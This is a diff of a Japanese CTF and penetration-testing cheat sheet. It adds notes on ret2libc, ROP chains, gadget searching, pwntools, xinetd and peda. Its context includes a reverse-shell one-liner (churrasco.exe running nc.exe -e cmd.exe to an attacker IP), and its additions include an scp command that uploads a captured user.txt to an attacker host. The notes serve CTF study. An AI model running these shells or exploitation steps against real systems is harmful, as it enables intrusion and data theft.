@@ -27,6 +27,7 @@ socialImage: "/media/cards/no-image.png"
 - [もくじ](#もくじ)
 - [使用頻度の高いコマンドまとめ](#使用頻度の高いコマンドまとめ)
   - [攻略開始時(ポートスキャン)](#攻略開始時ポートスキャン)
+  - [ネットワーク探索のポイント](#ネットワーク探索のポイント)
   - [Webスキャン](#webスキャン)
   - [攻撃ファイル転送](#攻撃ファイル転送)
   - [リバースシェル](#リバースシェル)
@@ -53,11 +54,19 @@ socialImage: "/media/cards/no-image.png"
   - [環境変数の確認](#環境変数の確認)
 - [特権取得(Windows)](#特権取得windows)
   - [mimikatzでKerberos環境を攻撃する](#mimikatzでkerberos環境を攻撃する)
+  - [ローカル特権昇格ツール](#ローカル特権昇格ツール)
 - [内部探索(Linux)](#内部探索linux)
+  - [便利コマンド](#便利コマンド)
 - [特権取得(Linux)](#特権取得linux)
 - [pwnのTips](#pwnのtips)
-  - [BOFサンプル](#bofサンプル)
+  - [プロセスにバイトコードを送り込む](#プロセスにバイトコードを送り込む)
+  - [Return to PLT/Return to libc](#return-to-pltreturn-to-libc)
   - [書式文字攻撃サンプル](#書式文字攻撃サンプル)
+  - [ROPサンプル](#ropサンプル)
+  - [GOT Overwriteサンプル](#got-overwriteサンプル)
+  - [glib、リンカのバージョン問題](#glibリンカのバージョン問題)
+  - [ローカルでバイナリをxintedする](#ローカルでバイナリをxintedする)
+  - [Pwn参考記事](#pwn参考記事)
 - [gdbのTips](#gdbのtips)
   - [フラグ置き換え方法](#フラグ置き換え方法)
   - [条件ジャンプ命令メモ](#条件ジャンプ命令メモ)
@@ -66,9 +75,10 @@ socialImage: "/media/cards/no-image.png"
   - [変数読み出し](#変数読み出し)
   - [実行時引数 / 標準入出力](#実行時引数--標準入出力)
   - [GDBをPythonで操作する](#gdbをpythonで操作する)
+  - [GDBでプロセスにアタッチ(ワンライナー)](#gdbでプロセスにアタッチワンライナー)
+  - [pedaの機能を使う](#pedaの機能を使う)
 - [angrのサンプル](#angrのサンプル)
   - [Hashcatサンプル](#hashcatサンプル)
-
 
 ## 使用頻度の高いコマンドまとめ
 
@@ -601,6 +611,16 @@ churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.10.1 9999"
 - マウントされたフラッシュディスクのデータをサルベージする
   - [USB メモリからのデータのサルベージ](https://kashiwaba-yuki.com/hackthebox-linux-mirai)
 
+### 便利コマンド
+
+``` bash
+# scp
+# upload
+scp user.txt kali@10.10.14.3:/home/kali/Downloads
+# download
+scp user@targethost.htb:/home/kali/user.txt ./
+```
+
 
 
 ## 特権取得(Linux)
@@ -620,6 +640,7 @@ import time
 
 elf = ELF("./chall")
 context.binary = elf
+# rop = ROP(elf)
 
 nopsled = b"\x41"*72
 payload = nopsled
@@ -643,6 +664,8 @@ p.interactive()
 # shellcode = p64(int(r.strip(), 0x10))
 # shellcode2 = p64(0x4011db)
 # p.sendline(payload + shellcode + b'\x41'*8 + shellcode2)
+
+
 ```
 
 - 標準入出力を使う
@@ -664,10 +687,38 @@ string.ascii_uppercase + string.ascii_lowercase + "0123456789"
 ### Return to PLT/Return to libc
 
 - `call`は、呼び出し時にリターンアドレスをスタックにpushしており、関数が終了する際に呼び出される`ret`は、スタックに積まれたリターンアドレスをpopしてEIPレジスタに書き込むことで呼び出し元に戻ることができる。
+
 - `call`は呼び出し時にリターンアドレスとrbpを順にスタックに積む。つまり、ローカルスタックの最上位スタックにはリターンアドレスが格納されている。
+
 - つまり、64bitELFの場合は基本的にはRBPレジスタ+0x8のアドレスにリターンアドレスが格納されているため、スタックを操作できる場合はこのアドレスの値を任意に書き換えることで戻り先を指定することが可能になる。
+
 - そのため、BOFを悪用する場合、入力値の先頭バイトが格納されるアドレスとRBPの値を取得することで、`$RBP+0x8-<入力値格納先>`の計算で比較的スマートにRIPの改ざんまでに必要なバイトサイズを特定することができる。
+
 - systemを呼び出す際にASLRでアドレスが変わる場合は、victim側のprintやputなどのアドレスをリークし、相対位置で実行時のsystemのアドレスを参照する必要がある。
+
+- Return to PLT：バイナリで使用される関数のプロセスリンケージテーブルエントリにジャンプし、それを使用してGOTポインタをリークし、libcバージョンを予測する
+
+- Return to libc：system()などのアドレスに直接ジャンプする
+
+  - 典型的なret2libcの場合は、まずlibcのアドレスをリークさせる
+  - リークさせたアドレスと[libc database search](https://libc.blukat.me/)を使って、libcのベースアドレスを特定する
+  - ベースアドレスとの相対位置から`/bin/sh`のアドレスを特定し、以下のようなスタック構成でシェルを取得できる
+
+  |   スタック   |
+  | :----------: |
+  |     ret      |
+  | pop rdi; ret |
+  |  `/bin/sh`   |
+  |   system()   |
+
+- PLTを探索する
+
+``` bash
+$ objdump -d -M intel -j .plt ./myapp
+
+# peda
+$ plt
+```
 
 ### 書式文字攻撃サンプル
 
@@ -684,18 +735,39 @@ python3 -c 'print("1\n" + "%p." * 50)' | nc mercury.picoctf.net 20195 | tr "." "
 
 ### ROPサンプル
 
-※ 工事中
+- ガジェットの探索
+
+``` bash
+$ ropper --file app
+$ ROPgadget --binary app
+```
+
+- pwntoolsのROPをロードする
+
+``` python
+elf = ELF("./app")
+rop = ROP(elf)
+```
+
+- ROPに使える機械語の対応
+
+| x86_64 | pop rdi; | 0x5f |
+| :----: | :------: | :--: |
+|        |          |      |
+|        |          |      |
+|        |          |      |
+
+- ROP Chainの構築
+
+``` bash
+$ ROPgadget --binary myapp --ropchain
+```
+
+参考：[HSCTF 6 - Combo Chain - HackMD](https://hackmd.io/@Xornet/BJh5RikpU)
 
 ### GOT Overwriteサンプル
 
 ※ 工事中
-
-### inetdで実行ファイルをデーモン化する
-
-``` bash
-sudo apt install openbsd-inetd -y
-
-```
 
 ### glib、リンカのバージョン問題
 
@@ -706,6 +778,37 @@ LD_PRELOAD=./libc.so.6 ./chall
 
 # patchelfとpwninitをダウンロードしておく
 pwninit
+```
+
+### ローカルでバイナリをxintedする
+
+- /etc/serviceを設定する
+
+``` bash
+# Local services
+app             10080/tcp
+```
+
+- /etc/xinetd.d/myapp を作成して、アプリケーションのパスを指定する
+
+``` bash
+$ cat /etc/xinetd.d/myapp 
+service app
+{
+        disable         = no
+        socket_type     = stream
+        wait            = no
+        user            = kali
+        server          = /home/kali/Downloads/app
+        log_on_failure  += USERID
+}
+```
+
+- サービスを起動して接続確認
+
+``` bash
+sudo service xinetd start
+nc localhost 10080
 ```
 
 ### Pwn参考記事
@@ -897,14 +1000,32 @@ for a in h:
 gdb.execute('quit')
 ```
 
-### GDBでプロセスにアタッチ
+### GDBでプロセスにアタッチ(ワンライナー)
 
 ``` bash
-# PIDの特定
-ps -au | grep ./myapp
+p=$(ps -ef | grep -v grep | grep myapp | awk '{print $2}'); gdb -p $p -x gdbcmd.txt
+```
 
-# GDBをアタッチ
-gdb -p <PID>
+### pedaの機能を使う
+
+``` bash
+# アドレス検索
+$ searchmem 0x603890
+$ searchmem "/bin/sh"
+
+# checksec
+$ checksec
+
+# ropgadget
+$ ropgadget
+ret = 0x401016
+popret = 0x401139
+addesp_8 = 0x401013
+
+# plt
+$ plt
+Breakpoint 5 at 0x401040 (system@plt)
+
 ```
 
 ## angrのサンプル
